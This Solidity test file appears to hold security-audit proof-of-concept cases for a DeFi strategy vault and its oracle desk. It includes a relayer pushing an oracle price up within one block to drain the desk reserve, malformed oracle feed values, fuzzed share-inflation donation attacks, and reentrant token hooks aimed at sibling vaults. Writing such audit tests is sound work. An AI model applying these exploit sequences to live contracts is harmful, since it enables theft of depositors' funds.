// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DeployV2Helper} from "../v2/helpers/DeployV2Helper.sol";
import {Constituent} from "../../interfaces/IStrategyVault.sol";
import {IStrategyVaultV2, VaultParams} from "../../v2/interfaces/IStrategyVaultV2.sol";
import {IVaultDeployerV2} from "../../v2/interfaces/IStrategyFactoryV2.sol";
import {IOracleDesk} from "../../v2/interfaces/IOracleDesk.sol";
import {TestToken, ReentrantToken} from "../v2/mocks/HostileTokens.sol";
import {FengAggregator} from "../../v2/oracle/FengAggregator.sol";

contract BadFeed {
    uint8 public decimals = 8;
    int256 public ans = 100e8;
    uint256 public upd;

    function set(uint8 d, int256 a, uint256 u) external {
        decimals = d;
        ans = a;
        upd = u;
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (1, ans, upd, upd, 1);
    }
}

abstract contract PoCBase is DeployV2Helper {
    function _wallet(address who) internal view returns (uint256) {
        return IERC20(usdg).balanceOf(who);
    }
}

// X-01 / F-01 and the desk exposure behind it (F-02)
contract PoC_Walk is PoCBase {
    IStrategyVaultV2 internal v;

    function setUp() public {
        _deployStack();
        (v,) = _fiftyFifty();
        _deposit(v, alice, 10_000 * U);
    }

    function test_X01_walkWithinOneBlock() public {
        (uint256 p0,) = oracle.getPrice(address(stocks[0]));
        vm.startPrank(relayer);
        for (uint256 i = 0; i < 10; i++) {
            feeds[0].updateAnswer(feeds[0].latestAnswer() * 115 / 100);
        }
        vm.stopPrank();
        (uint256 p1,) = oracle.getPrice(address(stocks[0]));
        emit log_named_uint("price multiple x100", p1 * 100 / p0);
        assertGt(p1, 3 * p0);
    }

    function test_F02_relayerDrainsDeskReserveInOneTx() public {
        uint256 reserve0 = desk.reserveUsdg();
        _mintUsdg(relayer, 10_000 * U);
        vm.startPrank(relayer);
        IERC20(usdg).approve(address(v), 10_000 * U);
        uint256 sh = v.deposit(10_000 * U, relayer, 0);
        for (uint256 i = 0; i < 10; i++) {
            feeds[0].updateAnswer(feeds[0].latestAnswer() * 115 / 100);
        }
        v.redeem(sh, relayer, relayer, 0);
        vm.stopPrank();
        uint256 profit = _wallet(relayer) - 0;
        emit log_named_uint("relayer final USDG (6dec)", profit);
        emit log_named_uint("desk reserve loss (6dec)", reserve0 - desk.reserveUsdg());
        assertGt(profit, 10_000 * U);
    }
}

// X-08 oracle sanity
contract PoC_Oracle is PoCBase {
    BadFeed internal bf;
    TestToken internal t;
    IStrategyVaultV2 internal v;

    function setUp() public {
        _deployStack();
        bf = new BadFeed();
        vm.startPrank(admin);
        t = new TestToken("BAD", "BAD", 18);
        oracle.setFeed(address(t), address(bf));
        desk.setToken(address(t), IOracleDesk.Mode.Mint);
        t.grantRole(t.MINTER_ROLE(), address(desk));
        vm.stopPrank();
        bf.set(8, 100e8, block.timestamp);
        (v,) = _create("BADV", _two(address(t), 5000, address(stocks[0]), 5000), 5000, 1 days);
        _deposit(v, alice, 1000 * U);
    }

    function test_X08_futureUpdatedAt() public {
        bf.set(8, 100e8, block.timestamp + 1);
        (bool fresh, uint256 old) = v.priceStatus();
        emit log_named_uint("future: fresh", fresh ? 1 : 0);
        emit log_named_uint("future: old", old);
        _mintUsdg(bob, 100 * U);
        vm.startPrank(bob);
        IERC20(usdg).approve(address(v), 100 * U);
        try v.deposit(100 * U, bob, 0) returns (uint256) {
            emit log("deposit with future updatedAt: SUCCEEDED");
        } catch (bytes memory r) {
            emit log_named_bytes("deposit with future updatedAt reverted", r);
        }
        vm.stopPrank();
    }

    function test_X08_maxUpdatedAt() public {
        bf.set(8, 100e8, type(uint256).max);
        try v.priceStatus() returns (bool f, uint256 o) {
            emit log_named_uint("max: fresh", f ? 1 : 0);
            emit log_named_uint("max: old", o);
        } catch (bytes memory r) {
            emit log_named_bytes("priceStatus with max updatedAt reverted", r);
        }
    }

    function test_X08_decimals30() public {
        bf.set(30, 100e30, block.timestamp);
        (uint256 p,) = oracle.getPrice(address(t));
        assertEq(p, 100e18);
    }

    function test_X08_zeroAndNegative() public {
        bf.set(8, 0, block.timestamp);
        (bool fresh,) = v.priceStatus();
        emit log_named_uint("zero answer priceStatus fresh", fresh ? 1 : 0);
        vm.expectRevert();
        v.totalAssetsUSDG();
        bf.set(8, -5, block.timestamp);
        vm.expectRevert();
        v.totalAssetsUSDG();
    }
}

abstract contract PoC_Inflation is PoCBase {
    IStrategyVaultV2 internal v;

    function setUp() public {
        _deployStack();
        (v,) = _fiftyFifty();
    }

    function _claim(address who) internal view returns (uint256) {
        return v.previewRedeem(IERC20(v.token()).balanceOf(who));
    }

    function _run(uint256 a, uint256 d, uint256 vic, bool donateStock) internal {
        a = bound(a, 1, 1_000_000 * U);
        d = bound(d, 0, 50_000_000 * U);
        vic = bound(vic, 1, 5_000_000 * U);
        _mintUsdg(alice, a);
        vm.startPrank(alice);
        IERC20(usdg).approve(address(v), a);
        try v.deposit(a, alice, 0) {} catch {
            vm.stopPrank();
            return;
        }
        vm.stopPrank();
        uint256 donated;
        if (donateStock) {
            uint256 n = d * 1e18 / (400 * U);
            stocks[0].mint(address(v), n);
            donated = n * 400 * U / 1e18;
        } else {
            _mintUsdg(address(v), d);
            donated = d;
        }
        _mintUsdg(bob, vic);
        uint256 navB = v.totalAssetsUSDG();
        uint256 supB = IERC20(v.token()).totalSupply();
        vm.startPrank(bob);
        IERC20(usdg).approve(address(v), vic);
        try v.deposit(vic, bob, 0) {} catch {
            vm.stopPrank();
            return;
        }
        vm.stopPrank();
        uint256 victimClaim = _claim(bob);
        uint256 attackerClaim = _claim(alice);
        uint256 pps = (navB + 1) / (supB + _vS()) + 2;
        uint256 slack = usdgDec <= 2 ? 12 : 3;
        uint256 tol = slack + pps + vic * 25 / 10_000;
        assertGe(victimClaim + tol, vic, "victim lost more than spread band");
        assertLe(attackerClaim, a + donated + tol, "attacker profit");
    }

    function testFuzz_usdgDonation(uint256 a, uint256 d, uint256 vic) public {
        _run(a, d, vic, false);
    }

    function testFuzz_stockDonation(uint256 a, uint256 d, uint256 vic) public {
        _run(a, d, vic, true);
    }

    function test_oneWeiFirstDeposit() public {
        _mintUsdg(alice, 1);
        vm.startPrank(alice);
        IERC20(usdg).approve(address(v), 1);
        v.deposit(1, alice, 0);
        vm.stopPrank();
        emit log_named_uint("shares for 1 unit", IERC20(v.token()).balanceOf(alice));
        _mintUsdg(address(v), 1_000_000 * U);
        _mintUsdg(bob, 1_999_999 * U);
        vm.startPrank(bob);
        IERC20(usdg).approve(address(v), 1_999_999 * U);
        uint256 s = v.deposit(1_999_999 * U, bob, 0);
        vm.stopPrank();
        emit log_named_uint("bob claim", _claim(bob));
        emit log_named_uint("alice claim", _claim(alice));
        s;
    }
}

contract PoC_Inflation_U6 is PoC_Inflation {
    function _usdgDecimals() internal view override returns (uint8) {
        return 6;
    }
}

contract PoC_Inflation_U18 is PoC_Inflation {
    function _usdgDecimals() internal view override returns (uint8) {
        return 18;
    }
}

contract PoC_Inflation_U2 is PoC_Inflation {
    function _usdgDecimals() internal view override returns (uint8) {
        return 2;
    }
}

contract PoC_Inflation_U0 is PoC_Inflation {
    function _usdgDecimals() internal view override returns (uint8) {
        return 0;
    }
}

contract PoC_Misc is PoCBase {
    function setUp() public {
        _deployStack();
    }

    function test_X09_donateToChildNeverProfits() public {
        (IStrategyVaultV2 c, address ct) = _fiftyFifty();
        _deposit(c, bob, 50_000 * U);
        (IStrategyVaultV2 p,) = _nested(c, ct);
        _deposit(p, alice, 10_000 * U);
        uint256 donation = 3_000 * U;
        _mintUsdg(address(c), donation);
        uint256 claim = p.previewRedeem(IERC20(p.token()).balanceOf(alice));
        emit log_named_uint("alice parent claim after child donation", claim);
        emit log_named_uint("alice paid in + donation", 10_000 * U + donation);
        assertLt(claim, 10_000 * U + donation);
    }

    function test_X10_250VaultsKeeper() public {
        for (uint256 i = 0; i < 205; i++) {
            vm.prank(creator);
            factory.createStrategy(
                "S", "SS", _two(address(stocks[0]), 5000, address(stocks[1]), 5000), 5000, 1 hours, 100, _meta()
            );
        }
        _skewAndAge(2 hours);
        uint256 g = gasleft();
        address[] memory due = engine.checkUpkeep();
        emit log_named_uint("gas checkUpkeep (200 scan)", g - gasleft());
        emit log_named_uint("due count in first page", due.length);
        address[] memory due2 = engine.checkUpkeepRange(200, 100);
        emit log_named_uint("due count in tail page", due2.length);
    }

    function test_dustVaultPerpetualFlag() public {
        (IStrategyVaultV2 v,) = _fiftyFifty();
        _deposit(v, alice, 2 * U);
        _setPrice(0, 404e8);
        (bool tb, bool th) = v.rebalanceNeeded();
        emit log_named_uint("timeBased", tb ? 1 : 0);
        emit log_named_uint("thresholdBased before", th ? 1 : 0);
        if (th) {
            v.executeRebalance();
            (tb, th) = v.rebalanceNeeded();
            emit log_named_uint("thresholdBased after executeRebalance", th ? 1 : 0);
        }
    }

    function test_emptyVaultDonationFlag() public {
        (IStrategyVaultV2 v,) = _fiftyFifty();
        stocks[0].mint(address(v), 1e18);
        (bool tb, bool th) = v.rebalanceNeeded();
        emit log_named_uint("empty+donation timeBased", tb ? 1 : 0);
        emit log_named_uint("empty+donation thresholdBased", th ? 1 : 0);
        if (th) {
            v.executeRebalance();
            emit log("executeRebalance on empty vault succeeded");
        }
    }

    function _params(Constituent[] memory c) internal view returns (VaultParams memory p) {
        p.name = "X";
        p.symbol = "XX";
        p.usdg = usdg;
        p.oracle = address(oracle);
        p.venue = address(desk);
        p.guardian = guardian;
        p.constituents = c;
        p.maxWeightBps = 5000;
        p.maxSlippageBps = 100;
        p.rebalanceInterval = 1 days;
        p.maxPriceStaleness = STALENESS;
        p.depth = 1;
    }

    function test_deployer_direct() public {
        VaultParams memory p = _params(_two(address(stocks[0]), 5000, address(stocks[1]), 5000));
        (address vault, address token) = deployer.deploy(p);
        assertTrue(vault != address(0) && vault.code.length > 0);
        assertEq(IStrategyVaultV2(vault).token(), token);
        assertFalse(registry.isRegistered(vault));

        VaultParams memory bad = _params(new Constituent[](0));
        vm.expectRevert(IStrategyVaultV2.EmptyConstituents.selector);
        deployer.deploy(bad);

        bytes memory cd = abi.encodeCall(IVaultDeployerV2.deploy, (p));
        (bool ok,) = address(deployer).call(bytes.concat(cd, hex"deadbeef"));
        emit log_named_uint("deploy with trailing junk ok", ok ? 1 : 0);
        (ok,) = address(deployer).call(abi.encodePacked(IVaultDeployerV2.deploy.selector, uint256(0x20), uint256(1)));
        assertFalse(ok);
        (ok,) = address(deployer).call(abi.encodePacked(IVaultDeployerV2.deploy.selector));
        assertFalse(ok);
        VaultParams memory over = _params(_two(address(stocks[0]), 5000, address(stocks[1]), 4000));
        vm.expectRevert(IStrategyVaultV2.WeightsMustSumTo10000.selector);
        deployer.deploy(over);
    }

    function test_hookCallsSiblingAndDesk() public {
        ReentrantToken rt = new ReentrantToken("RT", "RT", 18);
        _newInventoryToken(address(rt), 50e8, 1e24);
        (IStrategyVaultV2 a,) = _create("RA", _two(address(rt), 5000, address(stocks[0]), 5000), 5000, 1 days);
        (IStrategyVaultV2 b,) = _create("RB", _two(address(rt), 5000, address(stocks[1]), 5000), 5000, 1 days);
        _deposit(a, alice, 10_000 * U);
        _deposit(b, alice, 10_000 * U);
        uint256 pa = a.sharePrice();
        uint256 pb = b.sharePrice();
        bytes[] memory calls = new bytes[](5);
        calls[0] = abi.encodeCall(IStrategyVaultV2.deposit, (1e6, attacker, 0));
        calls[1] = abi.encodeCall(IStrategyVaultV2.redeem, (1, attacker, attacker, 0));
        calls[2] = abi.encodeCall(IStrategyVaultV2.executeRebalance, ());
        calls[3] = abi.encodeCall(IStrategyVaultV2.redeemInKind, (1, attacker, attacker));
        calls[4] = abi.encodeCall(IStrategyVaultV2.checkpoint, ());
        rt.arm(address(b), calls);
        _deposit(a, bob, 1000 * U);
        emit log_named_uint("sibling hook attempts", rt.attempts());
        emit log_named_uint("sibling hook successes", rt.successes());
        assertGe(a.sharePrice() + 2, pa);
        assertGe(b.sharePrice() + 2, pb);
        bytes[] memory dc = new bytes[](2);
        dc[0] = abi.encodeWithSignature("swapExactIn(address,address,uint256,uint256,address)", address(rt), usdg, 1, 0, attacker);
        dc[1] = abi.encodeWithSignature("fundReserve(uint256)", 1);
        rt.arm(address(desk), dc);
        _deposit(a, bob, 1000 * U);
        emit log_named_uint("desk hook attempts", rt.attempts());
        assertEq(rt.successes(), 0);
    }
}
